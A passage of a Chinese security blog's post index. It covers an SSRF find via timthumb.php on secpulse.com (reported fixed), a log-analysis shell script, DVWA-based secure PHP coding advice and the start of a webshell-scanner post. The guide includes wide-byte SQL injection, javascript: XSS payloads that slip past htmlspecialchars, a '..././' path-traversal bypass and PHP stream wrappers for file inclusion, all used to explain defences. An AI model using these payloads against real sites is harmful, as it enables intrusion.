<p><a href="https://www.secpulse.com/archives/49115.html" target="_blank" rel="external">https://www.secpulse.com/archives/49115.html</a></p>
<p><a href="https://www.secpulse.com/archives/6540.html" target="_blank" rel="external">https://www.secpulse.com/archives/6540.html</a></p>
<p><a href="https://xianzhi.aliyun.com/forum/mobile/read/750.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/mobile/read/750.html</a></p>
<p><a href="https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html" target="_blank" rel="external">https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html</a></p>
<p><a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="external">https://www.secpulse.com/archives/2166.html</a></p>
<p><a href="https://github.com/findys/sunburst/" target="_blank" rel="external">https://github.com/findys/sunburst/</a></p>
<p><a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="external">https://yeasy.gitbooks.io/docker_practice/</a></p>
<h2 id="安全脉搏链接未授权访问漏洞总结"><a href="#安全脉搏链接未授权访问漏洞总结" class="headerlink" title="安全脉搏链接未授权访问漏洞总结"></a>安全脉搏链接<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="external">未授权访问漏洞总结</a></h2>]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Python </tag>
            
            <tag> 未授权访问 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安全脉搏漏洞挖掘小记]]></title>
      <url>/2017/08/07/%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>不知道大家之前对安全脉搏打开的时候是不是感觉响应很慢，所以最近一直在排查，然后重新更换wordpress主题进行改版升级。在对安全脉搏进行维护、更新的时候，偶然之间发现了脉搏上的几个漏洞，在此记录下。<br><a id="more"></a></p>
<p>首先，打开主页。</p>
<p>打开某个网站不知道大家有什么习惯，但是作为一个”程序员”的我来说(伪程序员,我最喜欢有人叫我程序员了)，<em>F12</em>没关过。[斜眼笑]</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/secpulse_ssrf1.png" alt=""></p>
<p>不知道大家看这个图之后敏不敏感，反正我是挺敏感的(让我装个逼)。不知道为啥，这么久了竟然没人发现…</p>
<p>要是你你咋玩，首先我来了个百度<code>https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png&amp;h=304&amp;w=504&amp;zc=1</code></p>
<p>惊喜来了，竟然把网站绝对路径报出来了！信息比较敏感，我就不放图了。</p>
<p>这就存在两个漏洞了：</p>
<ul>
<li>没有关闭错误回显</li>
<li>没有对src参数的静态文件链接作校验</li>
</ul>
<p>然后看到<code>src</code>参数，大家会想到啥，没错！SSRF！</p>
<p>来一波试试</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/secpulse_ssrf2.png" alt=""></p>
<p>没毛病！</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%B2%A1%E6%AF%9B%E7%97%85.jpg" alt=""></p>
<p>然后我就想着 这是不是个通用漏洞啊，没准拿个CVE呢(不要揭穿我，让我意淫一会)，然后我搜了下，竟然真没有这个插件的SSRF漏洞，但是！！！悲伤的是我发现竟然不维护更新了。。。好吧。。</p>
<p>然后搜了一下这个插件的其他漏洞，竟然发现个命令执行！嘿嘿嘿嘿嘿。。。</p>
<p>不说了，四爷在我身边呢，我怕被打死。</p>
<p>PS:大家不要玩了，已经修复了。。。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[看我如何用20行代码做日志分析]]></title>
      <url>/2017/07/29/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E7%94%A820%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%81%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>不管是渗透测试、应急响应还是运维，日志分析都万分重要。而linux下日志分析最好的工具那就是linux自带的各种命令了。本文将从一个小例子来介绍”如何用linux命令做日志分析”。<br><a id="more"></a></p>
<h1 id="0x00-源码"><a href="#0x00-源码" class="headerlink" title="0x00 源码"></a>0x00 源码</h1><p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%B9%B21.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">if ls ./*.result &amp;&gt; /dev/null</div><div class="line">then</div><div class="line">    rm *.result</div><div class="line">fi</div><div class="line">touch log.result</div><div class="line">for i in www-*.log</div><div class="line">do</div><div class="line">    echo $i ...</div><div class="line">    awk &apos;$9 == 200 &#123;print $7&#125;&apos; $i|grep -i &apos;^/admin/upload/.*\.html$&apos;|sort|uniq -c|sed &apos;s/^ *//g&apos; &gt; $i.result</div><div class="line">    cat $i.result &gt;&gt; log.result</div><div class="line">    echo $i.result finished</div><div class="line">done</div><div class="line">echo final.log.result ...</div><div class="line">sort -k2 log.result | uniq -f1 --all-repeated=separate |./log.awk |sort -rn &gt; final.log.result</div><div class="line">echo final.log.result finished</div><div class="line"></div><div class="line">log.awk</div><div class="line">#!/usr/bin/awk -f</div><div class="line">BEGIN&#123;</div><div class="line">    RS=&quot;&quot;&#125;</div><div class="line">　　&#123;</div><div class="line">    sum=0</div><div class="line">    for(i=1;i&lt;=NF;i++)&#123;</div><div class="line">        if((i%2)!=0)&#123;</div><div class="line">            sum += $i&#125;</div><div class="line">　　&#125;</div><div class="line">        print sum,$2</div><div class="line">　　&#125;</div></pre></td></tr></table></figure></p>
<h1 id="0x01-Apache日志"><a href="#0x01-Apache日志" class="headerlink" title="0x01 Apache日志"></a>0x01 Apache日志</h1><p>以apache日志为例，下面是三条普通的apache日志记录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">58.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html HTTP/1.1&quot; 200 4649 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</div><div class="line">58.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/js/jquery-2.2.4.min.js HTTP/1.1&quot; 200 85578 &quot;http://121.43.182.76/vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</div><div class="line">58.40.124.211 - - [25/Jul/2017:08:53:13 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/favicon.ico HTTP/1.1&quot; 200 1517 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</div></pre></td></tr></table></figure></p>
<p><code>58.40.124.211</code>表示访问者IP，<code>25/Jul/2017:08:53:12 +0800</code>表示时间，<code>GET</code>表示请求方法，<code>vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html</code>表示访问的地址，<code>HTTP/1.1</code>表示使用HTTP协议的1.1版本，<code>200</code>表示响应状态码，<code>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0</code>表示访问者user-agent</p>
<p>我们分析一般关注的主要就是：</p>
<ul>
<li>IP地址</li>
<li>访问的地址</li>
<li>状态码</li>
</ul>
<p>本次就只演示获取某个地址的访问量并排序，即：<code>访问量 地址</code>这种效果。</p>
<h1 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h1><p>Apache日志文件格式形如<code>201707029.log</code>,根据文件格式设计总体思路如下:</p>
<ul>
<li>处理每天的日志，统计每日文章访问量</li>
<li>生成每月访问结果，统计月度访问量</li>
<li>生成每年访问结果，统计年度访问量</li>
</ul>
<h1 id="0x03-命令解析"><a href="#0x03-命令解析" class="headerlink" title="0x03 命令解析"></a>0x03 命令解析</h1><h2 id="0x03-1-awk"><a href="#0x03-1-awk" class="headerlink" title="0x03.1 awk"></a>0x03.1 awk</h2><p><strong><code>awk &#39;$9 == 200 {print $7}&#39; $i</code></strong></p>
<p>awk默认是以空格作为分隔符，$9表示匹配是200的响应，打印出第七个字段</p>
<h2 id="0x03-2-grep"><a href="#0x03-2-grep" class="headerlink" title="0x03.2 grep"></a>0x03.2 grep</h2><p><strong><code>grep -i &#39;^/admin/upload/.*\.html$&#39;</code></strong></p>
<p>根据awk匹配的结果，匹配访问的地址是<code>/admin/upload/.*\.html</code>的记录。i表示不区分大小写，<code>^$</code>是正则表达式的开头结尾。</p>
<h2 id="0x03-3-sort"><a href="#0x03-3-sort" class="headerlink" title="0x03.3 sort"></a>0x03.3 sort</h2><p><strong><code>sort -k2 log.result</code></strong></p>
<p>由于合成的记录是无序的，所以要将相同的归类。但是第一字段是访问次数，所以使用<code>k2</code>参数根据网址排序。<br><strong><code>sort -rn &gt; final.log.result</code></strong></p>
<p>对awk脚本的处理结果进行排序，sort默认使用第一个字段，参数r表示逆序，从大往小排；参数n表示以数值形式排序</p>
<h2 id="0x03-4-uniq"><a href="#0x03-4-uniq" class="headerlink" title="0x03.4 uniq"></a>0x03.4 uniq</h2><p><strong><code>uniq -c</code></strong></p>
<p>使用uniq过滤重复的记录，<code>-c</code>表示添加该记录出现的次数。<br><strong><code>uniq -f1 --all-repeated=separate</code></strong></p>
<p>参数<code>f1</code>表示忽略第一个字段（访问次数），只考虑后面的字段（网址）。参数<code>all-repeated=separate</code>，表示过滤掉所有只出现一次的记录，保留所有重复的记录，并且每一组之间用一个空行分隔</p>
<h2 id="0x03-5-sed"><a href="#0x03-5-sed" class="headerlink" title="0x03.5 sed"></a>0x03.5 sed</h2><p><strong><code>sed &#39;s/^ *//g&#39; &gt; $i.result</code></strong></p>
<p>由于uniq过滤后每条记录前面都是有空格的，所以要先删除掉。sed命令是一个处理行文本的编辑器，<code>&#39;s/^ *//g&#39;</code>是一个正则表达式(^和*之间有一个空格)表示每行记录的空格替换为空（即删除）并将排序结果重定向到文件。</p>
<h2 id="0x03-6-gt-和-gt-gt"><a href="#0x03-6-gt-和-gt-gt" class="headerlink" title="0x03.6 &gt;和&gt;&gt;"></a>0x03.6 &gt;和&gt;&gt;</h2><p><code>&gt;</code>表示重定向，即输出覆盖，<code>&gt;&gt;</code>也是重定向，但是是表示追加</p>
<h2 id="0x03-7-log-awk"><a href="#0x03-7-log-awk" class="headerlink" title="0x03.7 log.awk"></a>0x03.7 log.awk</h2><p>首先，默认情况下，awk将”\n”作为记录的分隔符，设置RS=””表示改为将空行作为分隔符其次，NF是一个awk的内置变量，表示当前行的字段总数。由于输入文件之中，每一行都包含两个字段，第一个是访问数，第二个是网址，所以这里做一个条件判断，只要是奇数字段就累加，偶数字段则一律跳过。最后，每个记录输出一个累加值和网址，它们之间用空格分割。</p>
<p><strong>参考文章：</strong><br><a href="http://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html" target="_blank" rel="external">http://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html</a><br><a href="http://blog.csdn.net/long2746004900/article/details/53367353" target="_blank" rel="external">http://blog.csdn.net/long2746004900/article/details/53367353</a><br><a href="http://www.cnblogs.com/wangqiguo/p/5863266.html" target="_blank" rel="external">http://www.cnblogs.com/wangqiguo/p/5863266.html</a><br><a href="http://blog.csdn.net/github_33736971/article/details/54286736" target="_blank" rel="external">http://blog.csdn.net/github_33736971/article/details/54286736</a><br><a href="http://blog.csdn.net/wenxuechaozhe/article/details/52564394" target="_blank" rel="external">http://blog.csdn.net/wenxuechaozhe/article/details/52564394</a><br><a href="http://www.cnblogs.com/dong008259/archive/2011/12/07/2279897.html" target="_blank" rel="external">http://www.cnblogs.com/dong008259/archive/2011/12/07/2279897.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 自动化 </tag>
            
            <tag> linux </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> 日志分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[跟着DVWA学Web安全开发]]></title>
      <url>/2017/07/10/%E8%B7%9F%E7%9D%80DVWA%E5%AD%A6Web%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/</url>
      <content type="html"><![CDATA[<p>本文已发布到“安全脉搏”，原文链接：<a href="https://www.secpulse.com/archives/59262.html" target="_blank" rel="external">https://www.secpulse.com/archives/59262.html</a></p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote>
<p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
</blockquote>
<p>本文将从DVWA中包含的各种漏洞来学习基本的Web安全开发中的需要注意的问题，本文旨在为Web开发中的新手提供一些安全指南，抛砖引玉，望大牛们多多指点。<br><a id="more"></a></p>
<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>1、使用<code>mysql_real_escape_string</code>函数，不要使用<code>addslashes</code><br><code>mysql_escape_string</code>已经被弃用，主要说下<code>mysql_real_escape_string</code>和<code>addslashes</code>的区别<br>1.1 这两个函数都会对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>和<code>\x00</code>进行转义处理，除此之外<code>mysql_real_escape_string</code>还会对<code>\r</code>、<code>\n</code>和<code>\x1a</code>进行转义。<br>1.2 在字符集为GBK时，<code>0xbf27</code>不是一个合法的多字节字符，但<code>0xbf5c</code>却是,若我们输入<code>0xbf27</code>addslashes会将它修改为<code>0xbf5c27</code>，<code>0xbf5c</code>会被当作单字节字符，所以成功注入一个单引号，这就是宽字节注入。<br>2、使用<code>is_numeric</code>函数，但是如果单使用<code>is_numeric</code>函数是不行的，因为使用十六进制、科学记数法即可轻松绕过。<br>3、使用PDO技术，PDO是PHP数据对象（PHP Data Object）的缩写，即使用它的准备语句（Prepared Statements，即“参数化查询”）。举个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$Statement = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;);</div><div class="line">$id = 18;</div><div class="line">$name = &apos;w2n1ck&apos;;</div><div class="line">$Statement-&gt;bindParam(1,$id);</div><div class="line">$Statement-&gt;bindParam(2,$name);</div><div class="line">$Statement-&gt;execute();</div><div class="line">$Statement-&gt;fetchAll();</div></pre></td></tr></table></figure></p>
<p>PHP会将将SQL模板<code>select * from info where id =? and name = ?</code>和变量bindParam(1,$id);bindParam(2,$name);分两次发送给MySQL，由MySQL完成变量的转义处理，然后进行参数字符串匹配即可。<br>(PS：之前还了解了语义分析防SQL注入，一直觉得PDO很好了，为啥还要语义分析，后来才恍然大悟，PDO是对开发的，语义分析人家是为了卖产品，mdzz)<br>4、DVWA里面还加了<code>Anti-CSRF token</code>验证，进一步提高了系统安全性</p>
<h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>DVWA中XSS防护流程步骤代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</div><div class="line">Sanitize message input</div><div class="line">$message = stripslashes( $message );</div><div class="line">$message = mysql_real_escape_string( $message );</div><div class="line">$message = htmlspecialchars( $message );</div></pre></td></tr></table></figure></p>
<p>1、使用trim函数，trim函数移除字符串两侧的空白字符或其他预定义字符。因为有时候我们会使用<code>\t、\n、\r&quot;</code>等尝试绕过。<br>2、使用stripslashes,删除由 addslashes()函数添加的反斜杠。<br>3、使用<code>mysql_real_escape_string</code>转义一些特殊的字符。<br>4、使用htmlspecialchars把特殊字符<code>&amp;,&quot;,&#39;,&lt;,&gt;</code>替换为HTML实体<code>&amp;amp;&amp;quot;&amp;#039;&amp;lt;&amp;gt;</code>,但我们还是可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;</div><div class="line">&lt;?php echo htmlspecialchars(&quot;javascript:alert(1)&quot;,ENT_QUOTES); ?&gt;</div><div class="line">&quot;&gt;test&lt;/a&gt;</div><div class="line">&lt;a href=&quot;</div><div class="line">&lt;?php echo htmlspecialchars(&quot;javascript:location%3Dhttp%3A%2F%2Fwww.baidu.com&quot;,ENT_QUOTES); ?&gt;</div><div class="line">&quot;&gt;test&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>总结：对输入(URL参数)进行过滤；对输出进行编码；白名单和黑名单结合；</p>
<h1 id="0x03-文件上传"><a href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h1><p>DVWA中文件安全上传的流程：</p>
<h2 id="1、取文件最后的扩展名"><a href="#1、取文件最后的扩展名" class="headerlink" title="1、取文件最后的扩展名"></a>1、取文件最后的扩展名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</div></pre></td></tr></table></figure>
<h2 id="2、对上传文件的文件名做随机数重命名操作"><a href="#2、对上传文件的文件名做随机数重命名操作" class="headerlink" title="2、对上传文件的文件名做随机数重命名操作"></a>2、对上传文件的文件名做随机数重命名操作</h2><p>DVWA用的是MD5，rand()函数也可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</div></pre></td></tr></table></figure></p>
<h2 id="3、采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小"><a href="#3、采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小" class="headerlink" title="3、采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小"></a>3、采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;</div><div class="line">    ( $uploaded_size &lt; 100000 ) &amp;&amp;</div><div class="line">    ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos;</div></pre></td></tr></table></figure>
<h2 id="4、检查是否为真正图片"><a href="#4、检查是否为真正图片" class="headerlink" title="4、检查是否为真正图片"></a>4、检查是否为真正图片</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getimagesize( $uploaded_tmp )</div></pre></td></tr></table></figure>
<h2 id="5、使用GD库或image-magick进行二次渲染"><a href="#5、使用GD库或image-magick进行二次渲染" class="headerlink" title="5、使用GD库或image-magick进行二次渲染"></a>5、使用GD库或<code>image-magick</code>进行二次渲染</h2><p>二次渲染，清除图片中的恶意代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$img = imagecreatefromjpeg( $uploaded_tmp );</div></pre></td></tr></table></figure></p>
<h2 id="6、回显相对路径"><a href="#6、回显相对路径" class="headerlink" title="6、回显相对路径"></a>6、回显相对路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) )</div></pre></td></tr></table></figure>
<p>DVWA中只是从代码设计层面考虑文件上传的安全性，比如还有Nginx与Apache的解析漏洞，截断问题，<code>.htaccess,.user.ini</code>后门,windows特性，ADS流，RTLO技术，包含漏洞等等。</p>
<h1 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h1><p>DVWA中的文件包含直接写死了就那几个文件，简单粗暴。。。</p>
<p>这里举一些需要注意的点：</p>
<ol>
<li>使用<code>open_basedir</code>配置，限制文件目录</li>
<li>过滤<code>./</code>,注意不是<code>../</code>，因为可以使用<code>..././..././</code>绕过</li>
<li>禁止服务器远程文件包含,allow_url_fopen=Off与allow_url_include=Off</li>
<li>注意<code>php://input</code>,<code>data://</code>等各种伪协议问题</li>
<li>注意截断问题，比如<code>%00</code>截断,超长路径截断，点号截断<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">file:///var/www/html  访问本地文件系统</div><div class="line">ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLs</div><div class="line">data://  数据流</div><div class="line">http:// — 访问 HTTP(s) URLs</div><div class="line">php://input — 访问各个输入/输出流</div><div class="line">zlib:// — 压缩流</div><div class="line">glob:// — 查找匹配的文件路径模式</div><div class="line">phar:// — PHP Archive</div><div class="line">ssh2:// — Secure Shell 2</div><div class="line">rar:// — RAR</div><div class="line">ogg:// — Audio streams</div><div class="line">expect:// — 处理交互式的流</div><div class="line">php://filter/</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="0x05-命令执行"><a href="#0x05-命令执行" class="headerlink" title="0x05 命令执行"></a>0x05 命令执行</h1><p>DVWA中是以ping命令为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$octet = explode( &quot;.&quot;, $target ); //以点号进行分割</div><div class="line">if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) //判断每个部分是否是数字，同时size是否为4</div></pre></td></tr></table></figure></p>
<p>这里举一些需要注意的点：</p>
<p>1.尽量少用执行命令的函数或者直接禁用<br>2.参数值尽量使用引号包裹<br>3.在使用动态函数之前，确保使用的函数是指定的函数之一<br>4.在进入执行命令的函数、方法之前，对参数进行过滤，对敏感字符进行转义，PHP中使用<code>escapeshellcmd</code>函数</p>
<pre><code>escapeshellcmd对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符 之前进行转义。
特殊字符有`#,&amp;,;反引号,|,*,?,~,&lt;,&gt;,^,(,),[,],{,},$,x0A,x00和xFF`。&apos;和&quot;仅在不配对的时候被转义。在Windows平台上以前缀`^`来转义的
</code></pre><h1 id="0x06-CSRF-跨站请求伪造"><a href="#0x06-CSRF-跨站请求伪造" class="headerlink" title="0x06 CSRF(跨站请求伪造)"></a>0x06 CSRF(跨站请求伪造)</h1><p>DVWA中的CSRF是以改密码为例。</p>
<h2 id="1、验证token"><a href="#1、验证token" class="headerlink" title="1、验证token"></a>1、验证token</h2><p>这是一个非常有效的手段，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// Check Anti-CSRF token</div><div class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</div></pre></td></tr></table></figure></p>
<h2 id="2、二次确认"><a href="#2、二次确认" class="headerlink" title="2、二次确认"></a>2、二次确认</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">// Get input</div><div class="line">$pass_curr = $_GET[ &apos;password_current&apos; ];</div><div class="line">...</div><div class="line">// Check that the current password is correct</div><div class="line">$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</div><div class="line">$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</div><div class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );</div><div class="line">$data-&gt;execute();</div><div class="line">// Do both new passwords match and does the current password match the user?</div><div class="line">if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) )&#123;&#125;</div></pre></td></tr></table></figure>
<p>二次确认就是在调用某些功能时进行二次验证，如：删除用户时，产生一个提示对话框，提示”确定删除用户吗？”,转账操作时，要求用户输入二次密码。</p>
<h2 id="3、验证码"><a href="#3、验证码" class="headerlink" title="3、验证码"></a>3、验证码</h2><p>这是一个非常简单并且有效的防御CSRF的方法。</p>
<h1 id="0x07-暴力破解"><a href="#0x07-暴力破解" class="headerlink" title="0x07 暴力破解"></a>0x07 暴力破解</h1><h2 id="1、增加验证码，token等验校字段"><a href="#1、增加验证码，token等验校字段" class="headerlink" title="1、增加验证码，token等验校字段"></a>1、增加验证码，token等验校字段</h2><p>DVWA中加入了Anti-CSRFtoken预防无脑爆破。</p>
<h2 id="2、增加sleep操作"><a href="#2、增加sleep操作" class="headerlink" title="2、增加sleep操作"></a>2、增加sleep操作</h2><p>只要登陆失败，则延迟3秒，大大降低了爆破速度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// Login failed</div><div class="line">sleep( rand( 2, 4 ) );</div></pre></td></tr></table></figure></p>
<h2 id="3、增加登陆错误机制"><a href="#3、增加登陆错误机制" class="headerlink" title="3、增加登陆错误机制"></a>3、增加登陆错误机制</h2><p>单用户，登陆次数错误到一定次数，即锁定该账户。此外还可以对用户IP等进行频次限制。</p>
<h1 id="0x08-验证码"><a href="#0x08-验证码" class="headerlink" title="0x08 验证码"></a>0x08 验证码</h1><p>验证码主要会出现一些逻辑漏洞，最常见的有两种：</p>
<ol>
<li>验证过程分两步，先验证验证码是否正确，正确则进行下一步</li>
<li>验证码没有设置有效时间，导致可以重复使用</li>
</ol>
<p><strong>参考链接：</strong><br><a href="http://www.jb51.net/article/56612.htm" target="_blank" rel="external">http://www.jb51.net/article/56612.htm</a><br><a href="http://www.freebuf.com/author/lonehand" target="_blank" rel="external">http://www.freebuf.com/author/lonehand</a><br><a href="http://www.cnblogs.com/Hyber/p/6133196.html" target="_blank" rel="external">http://www.cnblogs.com/Hyber/p/6133196.html</a><br><a href="http://www.am0s.com/functions/227.html" target="_blank" rel="external">http://www.am0s.com/functions/227.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> DVWA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[记D盾_Web查杀中的一个Bug]]></title>
      <url>/2017/07/07/%E8%AE%B0D%E7%9B%BE-Web%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AABug/</url>
      <content type="html"><![CDATA[<p>公司最近的接的项目，需要对40000个webshell样本分析，由于时间紧，也没写东西，先拿D盾凑合着用一次吧，记使用过程中遇到的一个bug。<br><a id="more"></a><br><img src="http://oa8y5guqs.bkt.clouddn.com/D%E7%9B%BE-1.png" alt=""><br>大家看这个图片</p>
